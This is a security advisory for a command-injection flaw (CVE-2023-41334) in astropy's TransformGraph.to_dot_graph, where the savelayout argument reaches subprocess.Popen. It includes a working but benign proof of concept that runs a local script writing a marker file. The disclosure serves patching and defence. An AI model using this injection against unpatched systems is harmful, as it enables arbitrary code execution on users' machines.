# RCE in TranformGraph().to_dot_graph function

**GHSA**: GHSA-h2x6-5jx5-46hf | **CVE**: CVE-2023-41334 | **Severity**: high (CVSS 8.4)

**CWE**: CWE-74, CWE-77

**Affected Packages**:
- **astropy** (pip): < 5.3.3

## Description

### Summary
RCE due to improper input validation in TranformGraph().to_dot_graph function

### Details

Due to improper input validation a malicious user can provide a command or a script file as a value to `savelayout` argument, which will be placed as the first value in a list of arguments passed to `subprocess.Popen`. 
https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539
Although an error will be raised, the command or script will be executed successfully.

### PoC

```shell
$ cat /tmp/script
#!/bin/bash
echo astrorce > /tmp/poc.txt
```
```shell
$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from astropy.coordinates.transformations import TransformGraph
>>> tg = TransformGraph()
>>> tg.to_dot_graph(savefn="/tmp/1.txt", savelayout="/tmp/script")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/u32i/.local/lib/python3.9/site-packages/astropy/coordinates/transformations.py", line 584, in to_dot_graph
    stdout, stderr = proc.communicate(dotgraph)
  File "/usr/lib/python3.9/subprocess.py", line 1134, in communicate
    stdout, stderr = self._communicate(input, endtime, timeout)
  File "/usr/lib/python3.9/subprocess.py", line 1961, in _communicate
    input_view = memoryview(self._input)
TypeError: memoryview: a bytes-like object is required, not 'str'
>>> 
```
```shell
$ cat /tmp/poc.txt
astrorce
```

### Impact
code execution on the user's machine

